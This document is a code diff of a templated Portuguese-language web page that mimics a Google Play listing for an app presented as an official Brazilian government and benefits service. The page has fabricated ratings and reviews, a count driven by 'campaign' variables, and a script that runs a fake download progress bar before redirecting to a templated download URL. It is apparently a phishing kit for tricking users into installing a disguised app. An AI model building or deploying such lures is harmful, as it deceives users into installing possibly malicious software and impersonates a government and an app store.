+                <img src="https://play-lh.googleusercontent.com/r9yQGHe9M3d7y2M7iiN6p_ORApvXwsPENbFb_bAJrGKXMYT4oSpPtQyrVPQ1QeX6bABhZ7Lz7eFWelCHYptg8ng=w2560-h1440-rw" alt="Screenshot 2">
+            </div>
+            <div class="screenshot">
+                <img src="https://play-lh.googleusercontent.com/bzv35OauNmskD0bva_z-wHhPiKSQIns0FKn_QTBH1NnuPYSGucMixG6w_ZuW5hKd2eLJwAX833k60A8BWRM=w2560-h1440-rw" alt="Screenshot 3">
+            </div>
+            <div class="screenshot">
+                <img src="https://play-lh.googleusercontent.com/4Cl39hasY1yzGH7PBpwVBczDFpJalkGjcVfuOP_BgQbgkKbLQre_ehafadylzruHjA4MRXBsQnwnyDq6ptmj=w2560-h1440-rw" alt="Screenshot 4">
+            </div>
+        </div>
+    </div>
+
+    <!-- ABOUT -->
+    <div class="about-section">
+        <div class="section-header">
+            <div class="section-title">Sobre este app</div>
+            <a href="#" class="section-link">Seta para cima</a>
+        </div>
+        <div class="about-text">
+            {{ campaign.app_name }} é o aplicativo oficial que permite acesso rápido e seguro a todos os serviços. 
+            Com interface moderna e atualizações constantes, oferecemos a melhor experiência para nossos usuários.
+            Baixe agora e aproveite todos os recursos disponíveis.
+        </div>
+        <div class="about-tags">
+            <span class="tag">#1 em Serviços e Informações do Brasil</span>
+            <span class="tag">Serviços públicos</span>
+            <span class="tag">Governo</span>
+            <span class="tag">Benefícios</span>
+        </div>
+    </div>
+
+    <!-- RATINGS -->
+    <div class="ratings-section">
+        <div class="section-header">
+            <div class="section-title">Avaliações e resenhas</div>
+            <a href="#" class="section-link">Ver tudo</a>
+        </div>
+        <div class="ratings-header">
+            <div>
+                <div class="rating-big">4,8</div>
+                <div class="stars-big">★★★★☆</div>
+                <div class="review-count">{{ (campaign.download_count // 1000 + 4530) }} mi avaliações</div>
+            </div>
+            <div class="rating-bars">
+                <div class="rating-bar">
+                    <span class="rating-bar-num">5</span>
+                    <div class="rating-bar-track"><div class="rating-bar-fill" style="width: 85%"></div></div>
+                    <span class="rating-bar-pct">85%</span>
+                </div>
+                <div class="rating-bar">
+                    <span class="rating-bar-num">4</span>
+                    <div class="rating-bar-track"><div class="rating-bar-fill" style="width: 10%"></div></div>
+                    <span class="rating-bar-pct">10%</span>
+                </div>
+                <div class="rating-bar">
+                    <span class="rating-bar-num">3</span>
+                    <div class="rating-bar-track"><div class="rating-bar-fill" style="width: 3%"></div></div>
+                    <span class="rating-bar-pct">3%</span>
+                </div>
+                <div class="rating-bar">
+                    <span class="rating-bar-num">2</span>
+                    <div class="rating-bar-track"><div class="rating-bar-fill" style="width: 1%"></div></div>
+                    <span class="rating-bar-pct">1%</span>
+                </div>
+                <div class="rating-bar">
+                    <span class="rating-bar-num">1</span>
+                    <div class="rating-bar-track"><div class="rating-bar-fill" style="width: 1%"></div></div>
+                    <span class="rating-bar-pct">1%</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="reviews-list">
+            <div class="review-item">
+                <div class="review-header">
+                    <div class="review-avatar">M</div>
+                    <div class="review-meta">
+                        <div class="review-name">Maria Silva</div>
+                        <div class="review-stars">★★★★★</div>
+                    </div>
+                    <div class="review-date">22/07/2026</div>
+                </div>
+                <div class="review-text">Muito prático e fácil de usar! Consigo acessar todos os meus benefícios em um só lugar. Recomendo demais.</div>
+                <div class="review-helpful">
+                    <div class="helpful-btn">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 9V5a3 3 0 0 0-3-3l-4 9v11h11.28a2 2 0 0 0 2-1.7l1.38-9a2 2 0 0 0-2-2.3zM7 22H4a2 2 0 0 1-2-2v-7a2 2 0 0 1 2-2h3"/></svg>
+                        1.2 mil
+                    </div>
+                    <div class="helpful-btn">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 15v4a3 3 0 0 0 3 3l4-9V2H5.72a2 2 0 0 0-2 1.7l-1.38 9a2 2 0 0 0 2 2.3zm7-13h3a2 2 0 0 1 2 2v7a2 2 0 0 1-2 2h-3"/></svg>
+                    </div>
+                </div>
+            </div>
+            <div class="review-item">
+                <div class="review-header">
+                    <div class="review-avatar" style="background: #ea4335;">J</div>
+                    <div class="review-meta">
+                        <div class="review-name">João Oliveira</div>
+                        <div class="review-stars">★★★★★</div>
+                    </div>
+                    <div class="review-date">20/07/2026</div>
+                </div>
+                <div class="review-text">Excelente app! Interface muito intuitiva e atualizações frequentes. Nunca tive problemas para acessar minhas informações.</div>
+                <div class="review-helpful">
+                    <div class="helpful-btn">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 9V5a3 3 0 0 0-3-3l-4 9v11h11.28a2 2 0 0 0 2-1.7l1.38-9a2 2 0 0 0-2-2.3zM7 22H4a2 2 0 0 1-2-2v-7a2 2 0 0 1 2-2h3"/></svg>
+                        856
+                    </div>
+                    <div class="helpful-btn">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 15v4a3 3 0 0 0 3 3l4-9V2H5.72a2 2 0 0 0-2 1.7l-1.38 9a2 2 0 0 0 2 2.3zm7-13h3a2 2 0 0 1 2 2v7a2 2 0 0 1-2 2h-3"/></svg>
+                    </div>
+                </div>
+            </div>
+            <div class="review-item">
+                <div class="review-header">
+                    <div class="review-avatar" style="background: #fbbc05;">A</div>
+                    <div class="review-meta">
+                        <div class="review-name">Ana Costa</div>
+                        <div class="review-stars">★★★★☆</div>
+                    </div>
+                    <div class="review-date">18/07/2026</div>
+                </div>
+                <div class="review-text">Gosto muito do app, mas às vezes demora um pouco para carregar. Fora isso, é muito útil no dia a dia.</div>
+                <div class="review-helpful">
+                    <div class="helpful-btn">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 9V5a3 3 0 0 0-3-3l-4 9v11h11.28a2 2 0 0 0 2-1.7l1.38-9a2 2 0 0 0-2-2.3zM7 22H4a2 2 0 0 1-2-2v-7a2 2 0 0 1 2-2h3"/></svg>
+                        432
+                    </div>
+                    <div class="helpful-btn">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 15v4a3 3 0 0 0 3 3l4-9V2H5.72a2 2 0 0 0-2 1.7l-1.38 9a2 2 0 0 0 2 2.3zm7-13h3a2 2 0 0 1 2 2v7a2 2 0 0 1-2 2h-3"/></svg>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- AGE RATING -->
+    <div class="age-section">
+        <div class="section-title" style="margin-bottom: 16px;">Classificação de conteúdo</div>
+        <div class="age-badge">
+            <div class="age-icon">L</div>
+            <div>
+                <div class="age-text">Classificação Livre</div>
+                <div class="age-sub">Conteúdo adequado para todos os públicos</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <div class="footer">
+        <svg class="google-play-logo" viewBox="0 0 120 40">
+            <path fill="#4285F4" d="M15 8v10l8.5-5L15 8z"/>
+            <path fill="#EA4335" d="M15 8l-10 6c-.6.4-1 1-1 1.5s.4 1 1 1.5l10 6V8z"/>
+            <path fill="#34A853" d="M15 28v-10l-8.5 5 8.5 5z"/>
+            <path fill="#FBBC05" d="M5 14c-1.5 1-2 2.5-1 3.5l1-1.5-.5-1.5-.5-.5z"/>
+            <text x="35" y="26" font-family="Google Sans, sans-serif" font-size="18" font-weight="500" fill="#5f6368">Google Play</text>
+        </svg>
+        <div class="footer-text">Passionate about quality apps.</div>
+        <div class="footer-links">
+            <a href="#">Política de Privacidade</a>
+            <a href="#">Termos de Serviço</a>
+            <a href="#">Sobre o Google Play</a>
         </div>
     </div>
 
     <script>
-        function installApp() {
-            document.getElementById('installModal').style.display = 'flex';
-        }
-        
+        let downloadInterval = null;
+
         function startDownload() {
-            document.getElementById('installModal').style.display = 'none';
             const btn = document.getElementById('installBtn');
-            const bar = document.getElementById('progressBar');
+            const container = document.getElementById('progressContainer');
             const fill = document.getElementById('progressFill');
-            
-            btn.textContent = 'Aguardando download...';
-            btn.classList.add('installing');
-            bar.style.display = 'block';
-            
+            const pct = document.getElementById('progressPct');
+            const label = document.getElementById('progressLabel');
+
+            btn.style.display = 'none';
+            container.classList.add('active');
+
             let progress = 0;
-            const interval = setInterval(() => {
-                progress += Math.random() * 15;
+            label.textContent = 'Baixando...';
+
+            downloadInterval = setInterval(() => {
+                progress += Math.random() * 12 + 3;
                 if (progress > 100) progress = 100;
+
                 fill.style.width = progress + '%';
-                
+                pct.textContent = Math.round(progress) + '%';
+
                 if (progress >= 100) {
-                    clearInterval(interval);
-                    btn.textContent = 'Instalando...';
+                    clearInterval(downloadInterval);
+                    label.textContent = 'Instalando...';
+                    pct.textContent = '';
+
                     setTimeout(() => {
                         window.location.href = '{{ download_url }}';
+                        label.textContent = 'Concluído';
+                        container.classList.remove('active');
+                        btn.style.display = 'block';
                         btn.textContent = 'Abrir';
-                        btn.classList.remove('installing');
                         btn.style.background = '#1a73e8';
-                    }, 1500);
+                        btn.onclick = function() {
+                            window.location.href = '{{ download_url }}';
+                        };
+                    }, 2000);
                 }
-            }, 300);
+            }, 200);
         }
-        
-        document.getElementById('installModal').addEventListener('click', function(e) {
-            if (e.target === this) this.style.display = 'none';
-        });
+
+        function cancelDownload() {
+            if (downloadInterval) {
+                clearInterval(downloadInterval);
+                downloadInterval = null;
+            }
+            const btn = document.getElementById('installBtn');
+            const container = document.getElementById('progressContainer');
+            const fill = document.getElementById('progressFill');
+            const pct = document.getElementById('progressPct');
+
+            container.classList.remove('active');
+            btn.style.display = 'block';
+            fill.style.width = '0%';
+            pct.textContent = '0%';
+        }
     </script>
 </body>
 </html>
